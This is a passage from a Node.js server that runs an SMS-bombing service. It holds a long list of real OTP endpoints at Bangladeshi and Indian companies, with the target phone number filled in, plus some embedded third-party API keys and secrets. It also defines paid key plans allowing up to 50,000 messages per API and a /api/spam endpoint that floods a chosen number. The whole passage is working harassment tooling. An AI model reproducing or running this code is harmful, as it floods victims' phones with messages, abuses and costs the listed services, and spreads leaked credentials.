  { id: 145, name: "GX api 22 Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
  { id: 146, name: "GX api 23 Deshal", method: "POST", url: "https://app.deshal.net/api/auth/login", body: {"phone": "{phone}"} },
  { id: 147, name: "GX api 24 GP Web", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: {"msisdn": "{phone}"} },
  { id: 148, name: "GX api 25 GP FWA", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: {"phone": "{phone}", "email": "", "language": "en"} },
  { id: 149, name: "GX api 26 BusBD", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: {"phone": "+88{phone}"} },
  { id: 150, name: "GX api 27 Paperfly", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"} },
  { id: 151, name: "GX api 28 OsudPotro", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"} },
  { id: 152, name: "GX api 29 Apex4u", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: {"phoneNumber": "{phone}"} },
  { id: 153, name: "GX api 30 Bohubrihi", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: {"phone": "{phone}", "intent": "login"} },
  { id: 154, name: "GX api 31 Fundesh", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP", body: {"msisdn": "{phone}"} },
  { id: 155, name: "GX api 32 Jatri", method: "POST", url: "https://user-api.jslglobal.co/v2/send-otp", body: {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"} },
  { id: 156, name: "GX api 33 RedX", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: {"mobile": "+88{phone}"} },
  { id: 157, name: "GX api 34 RabbitHole", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: {"mobile": "+88{phone}"} },
  { id: 158, name: "GX api 35 Qcoom", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: {"mobileNumber": "+88{phone}"} },
  { id: 159, name: "GX api 36 Garibook", method: "POST", url: "https://api.garibookadmin.com/api/v4/user/login", body: {"mobile": "+880{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web"} },
  { id: 160, name: "GX api 37 Training", method: "POST", url: "https://training.gov.bd/backoffice/api/user/sendOtp", body: {"mobile": "{phone}"} },
  { id: 161, name: "GX api 38 Shikho Discount", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: {"phone": "{phone}", "intent": "ap-discount-request"} },
  { id: 162, name: "GX api 39 Easy", method: "POST", url: "https://core.easy.com.bd/api/v1/registration", body: {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be..."} },
  { id: 163, name: "GX api 40 Robi DA", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: {"msisdn": "{phone}"} },
  { id: 164, name: "GX api 41 Hoichoi", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": true, "whatsappConsent": true} },
  { id: 165, name: "GX api 42 Addatimes", method: "POST", url: "https://app.addatimes.com/api/login", body: {"phone": "{phone}", "country_code": "BD"} },
  { id: 166, name: "GX api 43 Regal OTP", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: {"phone": "{phone}", "verification_code": ""} },
  { id: 167, name: "GX api 44 Regal Register", method: "POST", url: "https://regalfurniturebd.com/api/auth/register", body: {"name": "User", "email": "user@example.com", "phone": "{phone}", "password": "password123"} },
  { id: 168, name: "GX api 45 DeeptoPlay", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"} },
  { id: 169, name: "GX api 46 Timezone OTP", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: {"phone": "{phone}"} },
  { id: 170, name: "GX api 47 Timezone Register", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/regnewcustomer", body: {"name": "Tusar", "email": "fukc@gmail.com", "phone": "{phone}", "password": "aAeMY@5hG8iUfD4", "password_confirmation": "aAeMY@5hG8iUfD4"} },
  { id: 171, name: "GX api 48 UpaySystem", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: {"device_uuid": "...", "firebase_token": "...", "geo_location": "...", "mno": "Grameenphone", "wallet_number": "{phone}"} },
  { id: 172, name: "GX api 49 Chorki", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", body: {"number": "+880{phone}"} },
  { id: 173, name: "GX api 50 Arogga", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", body: {"mobile": "{phone}", "fcmToken": "", "referral": ""}, isFormData: true },
  { id: 174, name: "GX api 51 Pkluck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: {"mobileNum": "{phone}", "countryDialingCode": "880"} },
  { id: 175, name: "GX api 52 AppLink", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: {"msisdn": "880{phone}"} },
  { id: 176, name: "GX api 53 Care-Box", method: "POST", url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", body: {"Name": "Abdullah Al Mamun", "Phone": "+880{phone}"} },
  { id: 177, name: "GX api 54 Ghoori", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: {"mobile_no": "{phone}"} },
  { id: 178, name: "GX api 55 Jayabaji", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: {"mobileno": "{phone}", "username": "abffjddngf864", "firstname": "", "new_password": "tPNVOcen!6XEz3b", "confirm_new_password": "tPNVOcen!6XEz3b", "country_code": "880", "country": "BD", "currency": "BDT", "ref": "", "language": "en"} },
  { id: 179, name: "GX api 56 Swap", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: {"phone": "{phone}"} },
  { id: 180, name: "GX api 57 BdTickets", method: "POST", url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", body: {"phone": "+880{phone}"} },
  { id: 181, name: "GX api 58 Binge POST", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: {"mobile": "{phone}"} },
  { id: 182, name: "GX api 59 SendMySMS", method: "POST", url: "https://sendmysms.net/send-otp.php", body: {"phonenumber": "{phone}"}, isFormData: true },
  { id: 183, name: "GX api 60 Shikho Student", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: {"auth_type": "login", "phone": "{phone}", "vendor": "shikho", "type": "student"} },
  { id: 184, name: "GX api 61 Eonbazar", method: "POST", url: "https://app.eonbazar.com/api/auth/login", body: {"method": "otp", "mobile": "{phone}"} },
  { id: 185, name: "GX api 62 NESCO", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: {"phone_number": "{phone}"} },
  { id: 186, name: "GX api 63 Quizgiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", body: {"country_code": "+880", "phone": "{phone}"} },
  { id: 187, name: "GX api 64 Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
  { id: 188, name: "GX api 65 Bioscopelive", method: "POST", url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
  { id: 189, name: "GX api 66 Doubtnut2", method: "POST", url: "https://api.doubtnut.com/v4/student/login", body: {"phone_number": "{phone}", "language": "en"} },
  { id: 190, name: "GX api 67 PenPencil2", method: "POST", url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", body: {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{phone}"} },
  { id: 191, name: "GX api 68 BeepKart2", method: "POST", url: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", body: {"phone": "{phone}", "city": 362} },
  { id: 192, name: "GX api 69 Smytten2", method: "POST", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", body: {"phone": "{phone}", "email": "test@example.com"} },
  { id: 193, name: "GX api 70 MyHubble2", method: "POST", url: "https://api.myhubble.money/v1/auth/otp/generate", body: {"phoneNumber": "{phone}", "channel": "SMS"} },
  { id: 194, name: "GX api 71 Housing2", method: "POST", url: "https://login.housing.com/api/v2/send-otp", body: {"phone": "{phone}", "country_url_name": "in"} },
  { id: 195, name: "GX api 72 RentoMojo2", method: "POST", url: "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", body: {"phone": "{phone}"} },
  { id: 196, name: "GX api 73 Khatabook2", method: "POST", url: "https://api.khatabook.com/v1/auth/request-otp", body: {"phone": "{phone}", "app_signature": "wk+avHrHZf2"} },
  { id: 197, name: "GX api 74 Animall2", method: "POST", url: "https://animall.in/zap/auth/login", body: {"phone": "{phone}", "signupPlatform": "NATIVE_ANDROID"} },
  { id: 198, name: "GX api 75 Cosmofeed2", method: "POST", url: "https://prod.api.cosmofeed.com/api/user/authenticate", body: {"phone": "{phone}", "version": "1.4.28"} },
  { id: 199, name: "GX api 76 Spencers2", method: "POST", url: "https://jiffy.spencers.in/user/auth/otp/send", body: {"mobile": "{phone}"} },
  { id: 200, name: "GX api 77 Wakefit2", method: "POST", url: "https://api.wakefit.co/api/consumer-sms-otp/", body: {"mobile": "{phone}"} },

  // ===== GX SHADOWX APIS (201-250) =====
  ...Array.from({ length: 50 }, (_, i) => ({
    id: 201 + i,
    name: `GX ShadowX API ${201 + i}`,
    method: "GET",
    url: "https://shadowx-api.onrender.com/api/bm?num={phone}&count={count}",
    isShadowX: true
  })),

  // ===== LMNX9 APIS (251-350) =====
  ...Array.from({ length: 100 }, (_, i) => ({
    id: 251 + i,
    name: `LMNx9 API${i + 1}`,
    method: "GET",
    url: `https://lmnx9-sms-spam-v11.onrender.com/api${i + 1}?number={phone}`,
    isLMNx9: true
  }))
];

console.log(`🇧🇩 Total Bangladesh APIs loaded: ${BANGLADESH_APIS.length}`);

// ============================================================
// PLAN CONFIGURATION
// ============================================================

const PLAN_CONFIG = {
  free: {
    name: 'Free',
    maxCount: 50,
    requiresKey: false,
    rateLimit: 50,
    priority: 1,
    description: 'Free plan - 50 SMS/API, No key required'
  },
  premium: {
    name: 'Premium',
    maxCount: 500,
    requiresKey: true,
    rateLimit: 1000,
    priority: 3,
    description: 'Premium plan - 500 SMS/API, Key required'
  },
  enterprise: {
    name: 'Enterprise',
    maxCount: 5000,
    requiresKey: true,
    rateLimit: 5000,
    priority: 5,
    description: 'Enterprise plan - 5,000 SMS/API, Key required'
  },
  unlimited: {
    name: 'Unlimited',
    maxCount: 50000,
    requiresKey: true,
    rateLimit: 10000,
    priority: 10,
    description: 'Unlimited plan - 50,000 SMS/API, Key required'
  }
};

// ============================================================
// KEY MANAGEMENT
// ============================================================

class KeyManager {
  constructor() {
    this.keysDir = path.join(__dirname, 'data');
    this.keysFile = path.join(this.keysDir, 'keys.json');
    this.backupFile = path.join(this.keysDir, 'keys_backup.json');
    
    if (!fs.existsSync(this.keysDir)) {
      fs.mkdirSync(this.keysDir, { recursive: true });
    }
    
    this.validKeys = this.loadKeys();
    this.keyHistory = [];
    this.maxHistory = 1000;
    this.keyUsage = new Map();
    this.cleanupInterval = setInterval(() => this.cleanup(), 3600000);
    
    console.log(`📁 Key storage: ${this.keysFile}`);
    console.log(`🔑 Total keys loaded: ${this.validKeys.size}`);
  }

  loadKeys() {
    try {
      if (fs.existsSync(this.keysFile)) {
        const data = fs.readFileSync(this.keysFile, 'utf8');
        if (!data || data.trim() === '') return new Map();
        const parsed = JSON.parse(data);
        const keysMap = new Map();
        Object.entries(parsed).forEach(([key, value]) => {
          keysMap.set(key, {
            expiry: new Date(value.expiry),
            plan: value.plan || 'premium',
            created: new Date(value.created || Date.now()),
            lastUsed: value.lastUsed ? new Date(value.lastUsed) : null,
            usageCount: value.usageCount || 0,
            active: value.active !== false
          });
        });
        console.log(`📁 Loaded ${keysMap.size} keys`);
        return keysMap;
      } else {
        this.saveKeys();
        return new Map();
      }
    } catch (error) {
      console.error('❌ Error loading keys:', error.message);
      return new Map();
    }
  }

  saveKeys() {
    try {
      const obj = {};
      for (const [key, value] of this.validKeys.entries()) {
        obj[key] = {
          expiry: value.expiry.toISOString(),
          plan: value.plan,
          created: value.created.toISOString(),
          lastUsed: value.lastUsed ? value.lastUsed.toISOString() : null,
          usageCount: value.usageCount || 0,
          active: value.active !== false
        };
      }
      
      if (fs.existsSync(this.keysFile)) {
        try { fs.copyFileSync(this.keysFile, this.backupFile); } catch (e) {}
      }
      
      const tempFile = this.keysFile + '.tmp';
      fs.writeFileSync(tempFile, JSON.stringify(obj, null, 2), 'utf8');
      
      if (fs.existsSync(tempFile) && fs.statSync(tempFile).size > 0) {
        fs.renameSync(tempFile, this.keysFile);
        return true;
      }
      return false;
    } catch (error) {
      console.error('❌ Error saving keys:', error.message);
      return false;
    }
  }

  generateKey(plan = 'premium', days = 30) {
    try {
      const apiKey = Utility.generateApiKey();
      const expiryDate = new Date();
      expiryDate.setDate(expiryDate.getDate() + days);
      
      this.validKeys.set(apiKey, {
        expiry: expiryDate,
        plan: plan,
        created: new Date(),
        lastUsed: null,
        usageCount: 0,
        active: true
      });
      
      const saved = this.saveKeys();
      if (!saved) {
        this.validKeys.delete(apiKey);
        throw new Error('Failed to save key');
      }
      
      return { apiKey, expiryDate, plan, saved: true };
    } catch (error) {
      throw new Error(`Key generation failed: ${error.message}`);
    }
  }

  validateKey(key) {
    if (!this.validKeys.has(key)) return false;
    const keyData = this.validKeys.get(key);
    if (!keyData.active) return false;
    return new Date() < keyData.expiry;
  }

  getKeyInfo(key) {
    if (!this.validKeys.has(key)) return null;
    const keyData = this.validKeys.get(key);
    const now = new Date();
    return {
      key: key.substring(0, 10) + '...',
      fullKey: key,
      plan: keyData.plan,
      expires: keyData.expiry.toISOString(),
      valid: now < keyData.expiry && keyData.active,
      daysLeft: Math.max(0, Math.ceil((keyData.expiry - now) / (1000 * 60 * 60 * 24))),
      created: keyData.created.toISOString(),
      lastUsed: keyData.lastUsed ? keyData.lastUsed.toISOString() : null,
      usageCount: keyData.usageCount || 0,
      active: keyData.active
    };
  }

  useKey(key) {
    if (!this.validateKey(key)) return false;
    const keyData = this.validKeys.get(key);
    keyData.lastUsed = new Date();
    keyData.usageCount = (keyData.usageCount || 0) + 1;
    if (keyData.usageCount % 10 === 0) this.saveKeys();
    
    if (!this.keyUsage.has(key)) {
      this.keyUsage.set(key, { count: 0, resetTime: Date.now() + 60000 });
    }
    const usage = this.keyUsage.get(key);
    if (Date.now() > usage.resetTime) {
      usage.count = 0;
      usage.resetTime = Date.now() + 60000;
    }
    usage.count++;
    return true;
  }

  getRateLimit(key) {
    const keyData = this.validKeys.get(key);
    if (!keyData) return 0;
    const limits = { premium: 1000, enterprise: 5000, unlimited: 10000 };
    return limits[keyData.plan] || 100;
  }

  getAllKeys() {
    const keys = [];
    for (const [key, value] of this.validKeys.entries()) {
      keys.push({
        key: key.substring(0, 10) + '...',
        fullKey: key,
        plan: value.plan,
        expires: value.expiry.toISOString(),
        valid: new Date() < value.expiry && value.active,
        daysLeft: Math.max(0, Math.ceil((value.expiry - new Date()) / (1000 * 60 * 60 * 24))),
        usageCount: value.usageCount || 0,
        active: value.active !== false
      });
    }
    return keys;
  }

  cleanup() {
    const now = new Date();
    let count = 0;
    for (const [key, value] of this.validKeys.entries()) {
      if (now > value.expiry || !value.active) {
        this.validKeys.delete(key);
        count++;
      }
    }
    if (count > 0) this.saveKeys();
    return count;
  }

  getStorageInfo() {
    return {
      filePath: this.keysFile,
      fileExists: fs.existsSync(this.keysFile),
      fileSize: fs.existsSync(this.keysFile) ? Utility.formatBytes(fs.statSync(this.keysFile).size) : '0 Bytes',
      keysInMemory: this.validKeys.size
    };
  }

  destroy() {
    if (this.cleanupInterval) clearInterval(this.cleanupInterval);
    this.saveKeys();
  }
}

// ============================================================
// RATE LIMITER
// ============================================================

class RateLimiter {
  constructor() {
    this.requests = new Map();
    this.cleanupInterval = setInterval(() => this.cleanup(), 60000);
  }

  checkLimit(ip, key = null) {
    if (!CONFIG.security.rateLimit.enabled) return true;
    const identifier = key || ip;
    const now = Date.now();
    const windowMs = CONFIG.security.rateLimit.windowMs;
    const maxRequests = CONFIG.security.rateLimit.maxRequests;
    
    if (!this.requests.has(identifier)) this.requests.set(identifier, []);
    const timestamps = this.requests.get(identifier).filter(t => now - t < windowMs);
    timestamps.push(now);
    this.requests.set(identifier, timestamps);
    return timestamps.length <= maxRequests;
  }

  getRemaining(ip, key = null) {
    const identifier = key || ip;
    const now = Date.now();
    const windowMs = CONFIG.security.rateLimit.windowMs;
    const maxRequests = CONFIG.security.rateLimit.maxRequests;
    if (!this.requests.has(identifier)) return maxRequests;
    const timestamps = this.requests.get(identifier).filter(t => now - t < windowMs);
    return Math.max(0, maxRequests - timestamps.length);
  }

  cleanup() {
    const now = Date.now();
    const windowMs = CONFIG.security.rateLimit.windowMs;
    for (const [key, timestamps] of this.requests.entries()) {
      const filtered = timestamps.filter(t => now - t < windowMs);
      if (filtered.length === 0) this.requests.delete(key);
      else this.requests.set(key, filtered);
    }
  }

  destroy() {
    if (this.cleanupInterval) clearInterval(this.cleanupInterval);
  }
}

// ============================================================
// BOMB CONTROLLER
// ============================================================

class BombController {
  constructor() {
    this.activeJobs = new Map();
    this.pausedJobs = new Map();
    this.completedJobs = new Map();
    this.globalPause = false;
    this.globalStop = false;
    this.stats = {
      totalJobs: 0,
      totalSMS: 0,
      totalSuccess: 0,
      totalFailed: 0,
      startTime: Date.now(),
      peakActiveJobs: 0
    };
    this._logs = [];
  }

  registerJob(phone, totalCount, options = {}) {
    const jobId = Utility.generateJobId();
    const job = {
      id: jobId,
      phone: phone,
      maskedPhone: Utility.maskPhone(phone),
      totalCount: totalCount,
      sentCount: 0,
      successCount: 0,
      failCount: 0,
      startTime: Date.now(),
      status: 'active',
      options: options,
      progress: 0,
      errors: [],
      stopped: false,
      paused: false
    };
    this.activeJobs.set(jobId, job);
    this.stats.totalJobs++;
    if (this.activeJobs.size > this.stats.peakActiveJobs) {
      this.stats.peakActiveJobs = this.activeJobs.size;
    }
    this.logEvent('job_registered', { jobId, phone: job.maskedPhone, totalCount });
    return jobId;
  }

  isJobActive(jobId) {
    if (this.globalStop || this.globalPause) return false;
    const job = this.activeJobs.get(jobId);
    if (!job || job.stopped || job.paused) return false;
    return job.status === 'active';
  }

  stopJob(jobId) {
    const job = this.activeJobs.get(jobId);
    if (job) {
      job.stopped = true;
      job.status = 'stopped';
      job.endTime = Date.now();
      this.activeJobs.delete(jobId);
      this.completedJobs.set(jobId, job);
      return true;
    }
    return false;
  }

  stopAllJobs() {
    this.globalStop = true;
    let count = 0;
    for (const id of Array.from(this.activeJobs.keys())) {
      if (this.stopJob(id)) count++;
    }
    return count;
  }

  pauseJob(jobId) {
    const job = this.activeJobs.get(jobId);
    if (job && job.status === 'active' && !job.stopped) {
      job.paused = true;
      job.status = 'paused';
      this.activeJobs.delete(jobId);
      this.pausedJobs.set(jobId, job);
      return true;
    }
    return false;
  }

  pauseAllJobs() {
    this.globalPause = true;
    let count = 0;
    for (const id of Array.from(this.activeJobs.keys())) {
      if (this.pauseJob(id)) count++;
    }
    return count;
  }

  resumeJob(jobId) {
    const job = this.pausedJobs.get(jobId);
    if (job && !job.stopped) {
      job.paused = false;
      job.status = 'active';
      this.pausedJobs.delete(jobId);
      this.activeJobs.set(jobId, job);
      return true;
    }
    return false;
  }

  resumeAllJobs() {
    this.globalPause = false;
    this.globalStop = false;
    let count = 0;
    for (const id of Array.from(this.pausedJobs.keys())) {
      if (this.resumeJob(id)) count++;
    }
    return count;
  }

  updateJobStats(jobId, success, error = null, responseTime = 0) {
    const job = this.activeJobs.get(jobId);
    if (job && !job.stopped && !job.paused) {
      job.sentCount++;
      if (success) { job.successCount++; this.stats.totalSuccess++; }
      else { job.failCount++; this.stats.totalFailed++; if (error) job.errors.push({ timestamp: Date.now(), error }); }
      job.progress = ((job.sentCount / job.totalCount) * 100).toFixed(2);
      this.stats.totalSMS++;
      if (job.sentCount >= job.totalCount) {
        job.status = 'completed';
        job.endTime = Date.now();
        this.activeJobs.delete(jobId);
        this.completedJobs.set(jobId, job);
        this.logEvent('job_completed', { jobId, success: job.successCount, failed: job.failCount });
      }
    }
  }

  getJobStatus(jobId) {
    const job = this.activeJobs.get(jobId) || this.pausedJobs.get(jobId) || this.completedJobs.get(jobId);
    if (!job) return null;
    return {
      id: job.id, phone: job.maskedPhone, total: job.totalCount,
      sent: job.sentCount, success: job.successCount, fail: job.failCount,
      progress: job.progress + '%', status: job.status,
      startTime: job.startTime, endTime: job.endTime || null,
      stopped: job.stopped || false, paused: job.paused || false
    };
  }

  getAllJobs() {
    const jobs = [];
    this.activeJobs.forEach(job => jobs.push({ ...this.getJobStatus(job.id), status: 'active' }));
    this.pausedJobs.forEach(job => jobs.push({ ...this.getJobStatus(job.id), status: 'paused' }));
    this.completedJobs.forEach(job => jobs.push({ ...this.getJobStatus(job.id), status: job.status }));
    return jobs;
  }

  getStats() {
    const totalAttempts = this.stats.totalSuccess + this.stats.totalFailed;
    return {
      totalJobs: this.stats.totalJobs, totalSMS: this.stats.totalSMS,
      totalSuccess: this.stats.totalSuccess, totalFailed: this.stats.totalFailed,
      successRate: totalAttempts > 0 ? ((this.stats.totalSuccess / totalAttempts) * 100).toFixed(2) + '%' : '0%',
      activeJobs: this.activeJobs.size, pausedJobs: this.pausedJobs.size,
      completedJobs: this.completedJobs.size, globalPause: this.globalPause,
      globalStop: this.globalStop, uptime: ((Date.now() - this.stats.startTime) / 1000).toFixed(2) + 's'
    };
  }

  logEvent(event, data) {
    const logEntry = { timestamp: Date.now(), event, data };
    if (CONFIG.logging.console) console.log(`📝 [${Utility.getCurrentTime()}] ${event}:`, JSON.stringify(data).substring(0, 200));
    this._logs.push(logEntry);
    if (this._logs.length > 10000) this._logs.shift();
  }

  getLogs(limit = 100) { return (this._logs || []).slice(-limit); }
  clearCompleted() { const count = this.completedJobs.size; this.completedJobs.clear(); return count; }
  shutdown() { this.stopAllJobs(); }
}

// ============================================================
// EXPRESS APP SETUP
// ============================================================

const app = express();
const bombController = new BombController();
const keyManager = new KeyManager();
const rateLimiter = new RateLimiter();

app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: '*', methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'] }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => {
  req.requestId = Utility.generateId();
  res.setHeader('X-Request-ID', req.requestId);
  next();
});

app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    const duration = Date.now() - start;
    console.log(`📝 [${Utility.getCurrentTime()}] ${req.method} ${req.url} - ${res.statusCode} - ${duration}ms`);
  });
  next();
});

app.use((req, res, next) => {
  const ip = req.ip || req.connection.remoteAddress;
  const apiKey = req.query.key || req.headers['x-api-key'];
  if (!rateLimiter.checkLimit(ip, apiKey)) {
    return res.status(429).json({ success: false, error: 'Rate limit exceeded', developer: DEVELOPER_INFO });
  }
  next();
});

// ============================================================
// API ENDPOINTS
// ============================================================

app.get('/', (req, res) => {
  res.json({
    success: true, developer: DEVELOPER_INFO,
    version: "7.0.0-FINAL-BD", country: "Bangladesh Only",
    total_apis: BANGLADESH_APIS.length,
    endpoints: {
      generate_key: "/api/create-key?plan=premium&days=30&admin_key=TNEH_ADMIN_2024",
      spam: "/api/spam?plan=premium&key=YOUR_KEY&number=017XXXXXXXX&count=100",
      stop: "/api/stop?all=true", pause: "/api/pause?all=true",
      resume: "/api/resume?all=true", status: "/api/status"
    }
  });
});

app.get('/api/create-key', (req, res) => {
  const { plan = 'premium', days = '30', admin_key } = req.query;
  if (admin_key !== 'TNEH_ADMIN_2024') return res.status(403).json({ success: false, error: 'Invalid admin key' });
  if (!PLAN_CONFIG[plan]) return res.status(400).json({ success: false, error: `Invalid plan: ${plan}` });
  const validDays = Math.min(Math.max(parseInt(days) || 30, 1), 365);
  try {
    const result = keyManager.generateKey(plan, validDays);
    res.json({
      success: true, api_key: result.apiKey, plan: result.plan,
      plan_limit: PLAN_CONFIG[plan].maxCount, expires_in_days: validDays,
      expiry_date: result.expiryDate.toISOString(), saved_to_file: true,
      usage_example: `/api/spam?plan=${plan}&key=${result.apiKey}&number=017XXXXXXXX&count=${PLAN_CONFIG[plan].maxCount}`,
      developer: DEVELOPER_INFO, timestamp: Utility.getISOString()
    });
  } catch (error) {
    res.status(500).json({ success: false, error: 'Failed to generate key', details: error.message });
  }
});

app.get('/api/check-key', (req, res) => {
  const { key } = req.query;
  if (!key) return res.status(400).json({ success: false, error: 'Missing key parameter' });
  const keyInfo = keyManager.getKeyInfo(key);
  if (!keyInfo) return res.status(404).json({ success: false, error: 'API key not found' });
  res.json({ success: true, key_info: keyInfo, developer: DEVELOPER_INFO });
});

// ============================================================
// SPAM ENDPOINT - CALLS ALL 350 APIs
// ============================================================

app.get('/api/spam', async (req, res) => {
  const { plan = 'premium', number, count = '100', key } = req.query;
  
  console.log('\n========================================');
  console.log('📨 NEW SPAM REQUEST');
  console.log('⏰ Time:', new Date().toISOString());
  console.log('📱 Number:', number);
  console.log('🔢 Count:', count);
  console.log('📋 Plan:', plan);
  console.log('========================================\n');
  
  if (!PLAN_CONFIG[plan]) {
    return res.status(400).json({ success: false, error: `Invalid plan: ${plan}` });
  }
  
  const planConfig = PLAN_CONFIG[plan];
  
  if (planConfig.requiresKey) {
    if (!key) return res.status(401).json({ success: false, error: 'API key required' });
    if (!keyManager.validateKey(key)) return res.status(401).json({ success: false, error: 'Invalid API key' });
    keyManager.useKey(key);
    console.log('✅ Key validated');
  }
  
  if (!number) return res.status(400).json({ success: false, error: 'Missing phone number' });
  
  const cleanNumber = Utility.parsePhone(number);
  if (!Utility.isValidPhone(cleanNumber)) return res.status(400).json({ success: false, error: 'Invalid phone number' });
  
  let perApiCount = parseInt(count);
  if (isNaN(perApiCount) || perApiCount < 1) perApiCount = 1;
  if (perApiCount > planConfig.maxCount) {
    return res.status(400).json({ success: false, error: `Count exceeds ${plan} limit (${planConfig.maxCount})` });
  }
  
  const apiCount = BANGLADESH_APIS.length;
  const totalSMS = apiCount * perApiCount;
  
  console.log(`🇧🇩 Using ${apiCount} Bangladesh APIs`);
  console.log(`📨 Total SMS: ${totalSMS}`);
  
  const jobId = bombController.registerJob(cleanNumber, totalSMS, { plan, perApiCount, ip: req.ip, key });
  
  res.json({
    success: true, developer: DEVELOPER_INFO, jobId, plan,
    country: 'Bangladesh Only', target_number: Utility.maskPhone(cleanNumber),
    per_api_count: perApiCount, total_apis: apiCount, total_sms: totalSMS,
    status: 'started', message: `Bombing started with ${apiCount} APIs`,
    control_endpoints: {
      stop: `/api/stop?jobId=${jobId}`, pause: `/api/pause?jobId=${jobId}`,
      resume: `/api/resume?jobId=${jobId}`, status: `/api/status?jobId=${jobId}`
    },
    timestamp: Utility.getISOString()
  });
  
  console.log('🚀 Starting bombing process...\n');
  
  setTimeout(async () => {
    try {
      await sendBatch(BANGLADESH_APIS, cleanNumber, perApiCount, jobId, bombController);
      console.log(`\n✅ JOB ${jobId} COMPLETED!\n`);
    } catch (error) {
      console.error(`\n❌ JOB ${jobId} FAILED:`, error.message);
      bombController.stopJob(jobId);
    }
  }, 100);
});

// ============================================================
// CORE BOMBING FUNCTIONS
// ============================================================

async function sendBatch(apis, phone, countPerApi, jobId, controller) {
  console.log(`\n📦 STARTING BATCH PROCESSING`);
  console.log(`📱 Phone: ${Utility.maskPhone(phone)}`);
  console.log(`🔢 Count per API: ${countPerApi}`);
  console.log(`📡 Total APIs: ${apis.length}\n`);
  
  const actualCount = Math.min(countPerApi, CONFIG.performance.maxCountPerAPI);
  const BATCH_SIZE = 5;
  const shuffledAPIs = Utility.shuffleArray([...apis]);
  const totalAPIs = shuffledAPIs.length;
  let processedAPIs = 0, totalSuccess = 0, totalFailed = 0;
  
  for (let i = 0; i < shuffledAPIs.length; i += BATCH_SIZE) {
    if (!controller.isJobActive(jobId)) {
      console.log(`⏹️ Job stopped at ${processedAPIs}/${totalAPIs} APIs`);
      break;
    }
    
    const batch = shuffledAPIs.slice(i, i + BATCH_SIZE);
    const batchNum = Math.floor(i / BATCH_SIZE) + 1;
    const totalBatches = Math.ceil(totalAPIs / BATCH_SIZE);
    
    console.log(`━━━ BATCH ${batchNum}/${totalBatches} ━━━`);
    
    const batchPromises = batch.map(async (api) => {
      const apiPromises = [];
      for (let j = 0; j < actualCount; j++) {
        if (!controller.isJobActive(jobId)) break;
        apiPromises.push(callSingleAPI(api, phone, jobId));
      }
      
      try {
        const responses = await Promise.allSettled(apiPromises);
        const successful = responses.filter(r => r.status === 'fulfilled' && r.value.success).length;
        const failed = responses.filter(r => r.status === 'rejected' || (r.status === 'fulfilled' && !r.value.success)).length;
        
        totalSuccess += successful;
        totalFailed += failed;
        
        responses.forEach(r => {
          if (r.status === 'fulfilled' && !r.value.stopped) {
